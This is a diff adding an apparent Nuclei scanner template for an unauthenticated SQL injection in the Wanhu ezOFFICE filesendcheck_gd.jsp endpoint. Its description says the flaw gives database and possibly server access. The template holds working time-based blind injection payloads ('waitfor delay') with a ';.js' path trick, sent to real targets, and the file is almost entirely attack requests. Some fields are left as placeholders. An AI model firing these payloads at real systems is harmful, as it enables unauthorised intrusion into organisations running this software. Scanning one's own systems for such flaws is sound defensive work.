@@ -1,0 +1,24 @@
+id: wanhu-ezOFFICE-filesendcheck-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 万户 ezOFFICE filesendcheck_gd.jsp 接口处存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。
+  reference:
+    - https://github.com/wy876/POC/commit/f8d1c71b95c42a687b5b05af9c38e86b49051ea6
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/modules/govoffice/gov_documentmanager/filesendcheck_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:3'--"
+      - "{{BaseURL}}/defaultroot/modules/govoffice/gov_documentmanager/filesendcheck_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:6'--"
+      - "{{BaseURL}}/defaultroot/modules/govoffice/gov_documentmanager/filesendcheck_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:9'--"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
